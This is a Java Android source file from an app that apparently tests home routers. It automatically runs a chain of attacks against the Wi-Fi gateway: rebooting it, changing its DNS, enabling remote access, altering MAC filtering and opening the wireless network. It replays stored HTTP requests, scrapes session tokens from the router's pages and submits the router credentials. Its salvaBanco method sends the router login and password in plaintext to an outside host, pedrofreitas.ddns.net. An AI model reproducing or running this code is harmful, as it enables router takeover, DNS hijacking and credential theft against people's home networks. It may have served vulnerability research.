package br.pedrofreitas.myroutertestapp.util;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.codec.binary.Base64;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.CookieStore;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.protocol.ClientContext;
import org.apache.http.cookie.Cookie;
import org.apache.http.impl.client.AbstractHttpClient;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;

import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.util.Log;
import br.pedrofreitas.myroutertestapp.dao.AtaqueDao;
import br.pedrofreitas.myroutertestapp.dao.DadoDao;
import br.pedrofreitas.myroutertestapp.dao.ParamsDao;
import br.pedrofreitas.myroutertestapp.dao.PostGetDao;
import br.pedrofreitas.myroutertestapp.manager.Ataque;
import br.pedrofreitas.myroutertestapp.manager.Dado;
import br.pedrofreitas.myroutertestapp.manager.Params;
import br.pedrofreitas.myroutertestapp.manager.PostGet;

public class FinishAtaque extends AsyncTask<Void, String, Integer> {

	private Intent it;
	private Context mContext;
	private ProgressDialog mProgress;
	
	private long mIdDadoAtaque;
	
	private ArrayList<Ataque> mListAtaque;

	private boolean mAtacou;

	private int mCountTipoAtaques;
	private static final String[] ataques = {"reboot", "dns", "acesso", "filtromac", "abrirrede"};
			
	private URL urlSalvaBanco;
	private String urlInsereDado = "http://pedrofreitas.ddns.net/insereinfo.php?";

	private CookieStore cookieStore;
	private List<Cookie> cookies;
	
	HashMap nameValue;		//GET
	HashMap nameValueParam;		//POST
	
	
	public FinishAtaque(Context mContext, long mIdDadoAtaque, ArrayList<Ataque> mListAtaque, int mCountTipoAtaques, Intent it) {
		this.mContext = mContext;
		this.mIdDadoAtaque = mIdDadoAtaque;
		this.mListAtaque = mListAtaque;
		this.mCountTipoAtaques = mCountTipoAtaques;
		this.mAtacou = false;
		this.it = it;
	}

	@Override
	protected void onPreExecute() {
		super.onPreExecute();
	}
	
	@Override
	protected void onProgressUpdate(String... values) {
		mProgress.setMessage(values[0]);
	}

	@Override
	protected Integer doInBackground(Void... params) {
		android.os.Debug.waitForDebugger();	
		
		DadoDao mDadoDao = new DadoDao(mContext);
		Dado auxDado = mDadoDao.getDadoWithId(mIdDadoAtaque);		
		
		int mCountAtaques = 0;
				
		if(mListAtaque != null) {	
			
			while(mCountAtaques < mListAtaque.size()) {
				
				cookies = null;
							
				Ataque auxAtaque = mListAtaque.get(mCountAtaques);		
	
				PostGetDao mPostGetDao = new PostGetDao(mContext);
				List<PostGet> mListPostGet = mPostGetDao.getPostEGetWithIdAtaque(auxAtaque.getId());			
				
				Log.i("LISTA_POSTGET_" + mCountAtaques, "tamanho " + mListPostGet.size());
				
				int mCountPostGet = 0;	
				int mCountPostGetAux = 0;
				boolean erro = false;
				
				nameValue = null;
				nameValueParam = null;
				
				while(mCountPostGet < mListPostGet.size() && !erro) {				
					
					Iterator iterator = mListPostGet.iterator();
					PostGet auxPostGet = null;
					while(iterator.hasNext()) {
						auxPostGet = (PostGet) iterator.next();
						if(auxPostGet.getOrdem() > mCountPostGet) break;
					}
					
					Log.i("POSTGET_" + mCountAtaques + "_" + mCountPostGet, auxPostGet.toString());
					
					String comando = auxPostGet.getComando();						
					//Se existirem parametros de uma requisicao passada que devem ser usados na requisicao atual
					if(comando != null) {
						if(nameValue != null) {
							if(!nameValue.isEmpty()) {
								comando = buildUrl(comando, nameValue);
							}							
						}
						
						if(comando.contains("insereMAC")) {
							WifiManager manager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
							WifiInfo info = manager.getConnectionInfo();
							String address = info.getMacAddress();
							
							comando = comando.replaceAll("insereMAC", address);							
						}						
					}					
					
					if(auxPostGet.getTipo().contains("get")) {
					
						HttpGet httpGet = new HttpGet("http://" + auxDado.getGateway() + comando);
						
						Log.i("URL_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, "http://" + auxDado.getGateway() + comando);
						
						if(auxPostGet.getUsa_login() == 1) {
							byte[] encodedBytes = Base64.encodeBase64((auxDado.getLogin() + ":" + auxDado.getSenha()).getBytes());
							String encoding = new String(encodedBytes);
							Log.i("ENCODING_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, encoding + "(" + auxDado.getLogin() + ":" + auxDado.getSenha() + ")");
							httpGet.setHeader("Authorization", "Basic " + encoding);
						}
						

						final HttpParams httpParams = new BasicHttpParams();
						HttpConnectionParams.setConnectionTimeout(httpParams, 13000);
						
						HttpClient httpClient = new DefaultHttpClient(httpParams);
						HttpContext localContext = new BasicHttpContext();	
						HttpResponse httpResponse = null;
						try {							

							if(auxAtaque.getUsa_cookie() == 1) {
								if(cookies == null) {
//									httpResponse = httpClient.execute(httpGet);									
									cookieStore = ((AbstractHttpClient) httpClient).getCookieStore();
									cookies = cookieStore.getCookies();
									Log.i("COOKIE", "Salvo");	
									
									httpResponse = httpClient.execute(httpGet);									
								} else {
									for (Cookie cookie: cookies) {
										Log.i("COOKIE_VERSION", cookie.getVersion() + "");
										Log.i("COOKIE_NAME", cookie.getName());
										Log.i("COOKIE_VALUE", cookie.getValue());
										Log.i("COOKIE_DOMAIN", cookie.getDomain());
										Log.i("COOKIE_PATH", cookie.getPath());
										Log.i("COOKIE_EXPIRY", cookie.getExpiryDate() + "");	
									}
									localContext.setAttribute(ClientContext.COOKIE_STORE, cookieStore);
									httpResponse = httpClient.execute(httpGet, localContext);		
//									localContext.removeAttribute(ClientContext.COOKIE_STORE);
								}								
							} else {
								httpResponse = httpClient.execute(httpGet);								
							}			
							
							Log.i("RESPONSE_STATUS_" + mCountAtaques  + "_" + mCountPostGet, httpResponse.getStatusLine() + "");

							erro = true;							

							if(httpResponse.getStatusLine().getStatusCode() != HttpStatus.SC_UNAUTHORIZED) {			
							
								HttpEntity responseEntity = httpResponse.getEntity();
															
								InputStream content = (InputStream) responseEntity.getContent();
								BufferedReader in = new BufferedReader(new InputStreamReader(content));				
								String line;		
								
								//Se parametros retornados no html precisarem ser salvos para serem usados em alguma requisicao futura
								if(auxPostGet.getToken().contains("(.*?)")) {
									String[] paramsList = auxPostGet.getToken().split(";;");
									nameValue = new HashMap<String, String>();	
									nameValueParam = new HashMap<String, String>();	
									while ((line = in.readLine()) != null) {
										Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);															
										getParams(line, paramsList);										
									}							
									erro = false;
									mCountPostGetAux = auxPostGet.getOrdem();
								} else {
									while ((line = in.readLine()) != null) {
										Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);																
										if(line.contains(auxPostGet.getToken())) {
											erro = false;
											mCountPostGetAux = auxPostGet.getOrdem();
										}
									}					
								}									
								
								in.close();
								content.close();
								
								mCountPostGet = mCountPostGetAux;
							}
							
							if(erro) {
								mCountAtaques++;
							}					
							
						} catch (ClientProtocolException e) {
							Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, "ClientProtocolException", e);
							erro = true;
							mCountAtaques++;
						} catch (IOException e) {
							Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, "IOException", e);
							erro = true;
							mCountAtaques++;
						} finally {
							httpClient.getConnectionManager().shutdown();
						}						
							
					} else {
						if(auxPostGet.getTipo().contains("post")) {	
							
							HttpPost httpPost = new HttpPost("http://" + auxDado.getGateway() + comando);
					
							Log.i("URL_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, "http://" + auxDado.getGateway() + comando);
							
							//Usa o login mas nao como parametro
							if(auxPostGet.getUsa_login() == 2) {
								byte[] encodedBytes = Base64.encodeBase64((auxDado.getLogin() + ":" + auxDado.getSenha()).getBytes());
								String encoding = new String(encodedBytes);
								Log.i("ENCODING_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, encoding + "(" + auxDado.getLogin() + ":" + auxDado.getSenha() + ")");
								httpPost.setHeader("Authorization", "Basic " + encoding);
							}
							
							ParamsDao mParamsDao = new ParamsDao(mContext);
							List<Params> mListParms = mParamsDao.getParamsWithIdComando(auxPostGet.getId());
							List<NameValuePair>	auxParams;							
							
							if(mListParms.size() > 0) {
								auxParams = new ArrayList<NameValuePair>(mListParms.size());
								for(int i = 0; i < mListParms.size(); i++) {
									String name = mListParms.get(i).getNome();
									String value = mListParms.get(i).getValor();
									
									if(auxPostGet.getUsa_login() == 1) {
										//O parametro e o usuario do login
										if(mListParms.get(i).getValor().contains("insereUsuario")) {
											value = auxDado.getLogin();
										}
										
										//O parametro e a senha do login
										if(mListParms.get(i).getValor().contains("insereSenha")) {
											value = auxDado.getSenha();
										}
																				
									}
									
									//Parametros guardados em requisicao passada
									if(nameValueParam != null) {
										if(!nameValueParam.isEmpty()) {
											if(nameValueParam.get(value) != null) {
												value = (String) nameValueParam.get(value);
												nameValueParam.remove(value);	
											}						
										}
									}

									if(value.contains("insereMAC:")) {
										WifiManager manager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
										WifiInfo info = manager.getConnectionInfo();
										String address = info.getMacAddress();
										address = address.replace(":", "");
										value = value.replaceAll("insereMAC:", address);
									}
									
									auxParams.add(new BasicNameValuePair(name, value));
									Log.i("PARAM_NAME_" + mCountAtaques + "_" + i , name);
									Log.i("PARAM_VALUE_" + mCountAtaques + "_" + i , value);
								}
								try {
									httpPost.setEntity(new UrlEncodedFormEntity(auxParams, "UTF-8"));							
								} catch(UnsupportedEncodingException e) {
									Log.e(ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, "UnsupportedEncodingException", e);
								}						
							}
								
							
							final HttpParams httpParams = new BasicHttpParams();
							HttpConnectionParams.setConnectionTimeout(httpParams, 13000);
							
							HttpClient httpClient = new DefaultHttpClient(httpParams);
							HttpContext localContext = new BasicHttpContext();							
							HttpResponse httpResponse = null;
							try {								
								
								if(auxAtaque.getUsa_cookie() == 1) {
									if(cookies == null) {							
//										httpResponse = httpClient.execute(httpPost);
										cookieStore = ((AbstractHttpClient) httpClient).getCookieStore();
										cookies = cookieStore.getCookies();										
										Log.i("COOKIE", "Salvo");
										
										httpResponse = httpClient.execute(httpPost);
									} else {
										for (Cookie cookie: cookies) {
											Log.i("COOKIE_VERSION", cookie.getVersion() + "");
											Log.i("COOKIE_NAME", cookie.getName());
											Log.i("COOKIE_VALUE", cookie.getValue());
											Log.i("COOKIE_DOMAIN", cookie.getDomain());
											Log.i("COOKIE_PATH", cookie.getPath());
											Log.i("COOKIE_EXPIRY", cookie.getExpiryDate() + "");						
										}	
										
										localContext.setAttribute(ClientContext.COOKIE_STORE, cookieStore);										
										httpResponse = httpClient.execute(httpPost, localContext);	
//										localContext.removeAttribute(ClientContext.COOKIE_STORE);
									}									
								} else {
									httpResponse = httpClient.execute(httpPost);
								}
								
								Log.i("RESPONSE_STATUS_" + mCountAtaques + "_" + mCountPostGet, httpResponse.getStatusLine() + "");
								
								erro = true;
								
								if(httpResponse.getStatusLine().getStatusCode() != HttpStatus.SC_UNAUTHORIZED) {									
									
									HttpEntity responseEntity = httpResponse.getEntity();
						
									InputStream content = (InputStream) responseEntity.getContent();
							        BufferedReader in = new BufferedReader(new InputStreamReader(content));
							        String line;
							        
							        //Se parametros retornados no html precisarem ser salvos para serem usados em requisicao futura
									if(auxPostGet.getToken().contains("(.*?)")) {
										String[] paramsList = auxPostGet.getToken().split(";;");
										nameValue = new HashMap<String, String>();	
										nameValueParam = new HashMap<String, String>();									
										while ((line = in.readLine()) != null) {
											Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);															
											getParams(line, paramsList);										
										}								
										erro = false;
										mCountPostGetAux = auxPostGet.getOrdem();
									} else {
										while((line = in.readLine()) != null) {
											Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);										
											if(line.contains(auxPostGet.getToken())) {
												erro = false;
												mCountPostGetAux = auxPostGet.getOrdem();
											}	
										}									
									}						        
							        
							        in.close();
							        content.close();
							        
									mCountPostGet = mCountPostGetAux;								
								}	
								
								//Condicao criado pois apos o reboot no Sagemcom F@st2764 e retornado html vazio
								if(auxPostGet.getOrdem() == mListPostGet.size() && auxPostGet.getComando().equals("/index.cgi")) {
									erro = false;
									mCountPostGet = auxPostGet.getOrdem();
								}
								
						        if(erro) {
						        	mCountAtaques++;
								}
								
							} catch (ClientProtocolException e) {
								Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() +"_" + mCountAtaques  + "_" + mCountPostGet, "ClientProtocolException", e);
								erro = true;
								mCountAtaques++;
							} catch (IOException e) {
								Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques  + "_" + mCountPostGet, "IOException", e);
								erro = true;
								//Condicao por causa do ataque reboot e abrir rede da technicolor, e abrir rede da zyXEL
								if(auxPostGet.getOrdem() == mListPostGet.size() && (auxPostGet.getComando().equals("/reboot.cgi") || 
																					auxPostGet.getComando().equals("/wlwpa.cgi") ||
																					auxPostGet.getComando().equals("/cgi-bin/WLAN_General.asp"))) {
									mCountPostGet = auxPostGet.getOrdem();
								} else {
									mCountAtaques++;								
								}							
							} finally {
								httpClient.getConnectionManager().shutdown();
							}						
							
						} else {
							Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, "Comando HTTP nao identificado");
							mAtacou = false;
							break;						
						}
					}
				}	
				
				if(mCountPostGet >= mListPostGet.size()) {
					mAtacou = true;
					break;
				}
			}			
		} 
				
		return mCountAtaques;
	}
	
	@Override
	protected void onPostExecute(Integer result) {
		super.onPostExecute(result);
		int mCountAtaques = (int) result;	
		
		DadoDao mDadoDao = new DadoDao(mContext);
		Dado auxDado = mDadoDao.getDadoWithId(mIdDadoAtaque);	
				
		Log.i("DADO_TEMP", auxDado.toString());
		
		if(mAtacou) {		
			switch (ataques[mCountTipoAtaques]) {
				case "reboot":
					auxDado.setReboot_ataque(1);
					break;
				case "dns":
					auxDado.setDns_ataque(1);
					break;
				case "acesso":
					auxDado.setAcesso_remoto_ataque(1);
					break;					
				case "filtromac":
					auxDado.setFiltro_mac_ataque(1);
					break;
				case "abrirrede":
					auxDado.setAbrir_rede_ataque(1);
					break;
				default:
					Log.e("ERR_TIPO", "Tipo de ataque nao identificado");
					break;
			}
			mDadoDao.update(auxDado);
			
			Log.i(ataques[mCountTipoAtaques].toUpperCase() + "_SUCESSO", mListAtaque.get(mCountAtaques).toString());	
			Log.i("STATUS", "Ataque tipo '" + ataques[mCountTipoAtaques] + "' encerrado com sucesso");	
			try {
				Thread.sleep(150000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		} else {
			Log.i("STATUS", "Ataque tipo '" + ataques[mCountTipoAtaques] + "' encerrado sem sucesso");	
			try {
				Thread.sleep(20000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		
		if(mCountTipoAtaques == ataques.length - 1) {
			salvaBanco(auxDado);			
			mProgress.setMessage("Concluído");
			mProgress.dismiss();
//			mContext.startActivity(it);
		} else {
			mCountTipoAtaques++;
			Log.i("STATUS", "Proximo ataque tipo '" + ataques[mCountTipoAtaques] + "' iniciando...");
			
			AtaqueDao mAtaqueDao = new AtaqueDao(mContext);		
			ArrayList<Ataque> mListAtaque = mAtaqueDao.getAtaquesWithOperadoraETipoEFabricanteModelo(auxDado.getOperadora(), ataques[mCountTipoAtaques], auxDado.getFabricante_modelo());
			
			if(mListAtaque != null) {
				Log.i("LISTA_" + ataques[mCountTipoAtaques].toUpperCase(), "tamanho " + mListAtaque.size());				
			} else {
				Log.i("LISTA_" + ataques[mCountTipoAtaques].toUpperCase(), "Lista vazia");
			}	
			
			
			new FinishAtaque(mContext, mIdDadoAtaque, mListAtaque, mCountTipoAtaques, it).execute();					
		}	
	}

	public void salvaBanco(Dado auxDado) {	
		try {
			urlSalvaBanco = new URL (urlInsereDado + "ip=" + auxDado.getIp() + "&gateway=" + auxDado.getGateway() + "&operadora=" + auxDado.getOperadora() + 
							"&data=" + auxDado.getData() + "&fabricante_modelo=" + auxDado.getFabricante_modelo() + "&reboot_ataque" + auxDado.getReboot_ataque() +
							"&dns_ataque=" + auxDado.getDns_ataque() + "&acesso_remoto_ataque=" + auxDado.getAcesso_remoto_ataque() + "&filtro_mac_ataque=" +	auxDado.getFiltro_mac_ataque() +
							"&abrir_rede_ataque=" + auxDado.getAbrir_rede_ataque() + "&login=" + auxDado.getLogin() + "&senha=" + auxDado.getSenha());
			URLConnection connectionSalva = (URLConnection) urlSalvaBanco.openConnection();
		} catch (MalformedURLException e) {
			Log.e("ERR_SALVAR", "MalformedURLException", e);
		} catch (IOException e) {
			Log.e("ERR_SALVAR", "IOException", e);
		}
		
		Log.i("DADO_SALVO", auxDado.toString());
	}
	
	public void getParams(String line, String[] paramsList) {
		for(int i = 0; i < paramsList.length; i++) {
			Pattern pattern = Pattern.compile(paramsList[i]);
			Matcher matcher = pattern.matcher(line);										
			
			String value = null;
			while(matcher.find()) {
				value = matcher.group(1);
			}
			
			if(value != null) {
				String name = paramsList[i];
				//Caso o parametro esteja num input
				if(name.toLowerCase().contains("<input")) {	
					if(name.contains("autocomplete=\"off\"")) {
						name = "ssid";
					} else {											
						if(name.contains("SSID_INDEX") || name.contains("EnableWLanFlag") || name.contains("HideSsidFlag")) {
							name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\"  value"));						
						} else {						
							if(name.contains("NewNtpTimeServer") || name.contains("TimeSntpEnable") || name.contains("saRgIpMgmtWanDualIpRipAdvertised")) {
								name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\" id"));	
							} else {
								if(name.contains("h_DaylightSavingEnable") || name.contains("addNtpServer") || name.contains("removeNtpServer")) {
									name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\" type"));
								} else {
									if(name.contains("id=")) {
										name = name.substring(name.indexOf("id=\"") + 4, name.indexOf("\" name"));
									} else {
										if(name.contains("title=")) {
											name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\" title"));
										} else {
											if(name.contains("size=")) {
												name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\" size"));
											} else {
												if(name.contains("Name=")) {
													name = name.substring(name.indexOf("Name=\"") + 6, name.indexOf("\" value"));						
												} else {
													if(name.contains("name=")) {
														name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\" value"));						
													} else {
														if(name.contains("NAME=")) {
															name = name.substring(name.indexOf("NAME=\"") + 6, name.indexOf("\" value"));						
														} else {
															Log.e("PARAM_NAME", "Nao foi encontrado o nome do paramaetro");
														}
														
													}									
												}
											}											
										}						
									}								
								}
							}							
						}					
					}
					
					if(name.equals("sessionid")) {
						nameValue.put("sessionid", value.trim());
					}
					
					nameValueParam.put("insere" + name.trim(), value.trim());
				} else {
					if(name.contains("var sessionKey=") || name.contains("loc \\+= \'&sessionKey=")) {						
						nameValue.put("sessionKey", value.trim());
					} else {						
						name = name.substring(0, name.indexOf("="));
						//p.e. B0:C2:87:46:77:12
						if(value.contains(":")) {
							String[] valueList = value.split(":");
							for(int k = 0; k < valueList.length; k++) {					
								nameValue.put(name.trim() + (k + (2 * k)) + "-" + (k + (2 * (k + 1))), valueList[k].trim());	
							}
						} else {
							nameValue.put(name.trim(), value.trim());
						}								
					}
				}				
			}
		}				
	}
	
	public String buildUrl(String url, HashMap nameValue) {

		for(Object name: nameValue.keySet()) {
			Log.i("URL_PARAM_NAME", name.toString());
			Log.i("URL_PARAM_VALUE", nameValue.get(name).toString());
		}
		
		Iterator<Map.Entry<String, String>> iterator = nameValue.entrySet().iterator();
		while(iterator.hasNext()) {
			Map.Entry<String, String> entry = iterator.next();
			if(url.contains("insere" + entry.getKey())) {
				url = url.replaceAll("insere" + entry.getKey(), entry.getValue());	
				iterator.remove();	
			}
		}		
				
		return url;
	}
	
	public static String getIpAddress() { 
        try {
            for(Enumeration en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = (NetworkInterface) en.nextElement();
                for (Enumeration enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = (InetAddress) enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        String ipAddress=inetAddress.getHostAddress().toString();
                        Log.i("IPV4", ipAddress);
                        return ipAddress;
                    }
                }
            }
        } catch (SocketException e) {
            Log.e("ERR_IPV4", "SocketException", e);
        }
        
        return null; 
	}
		
}



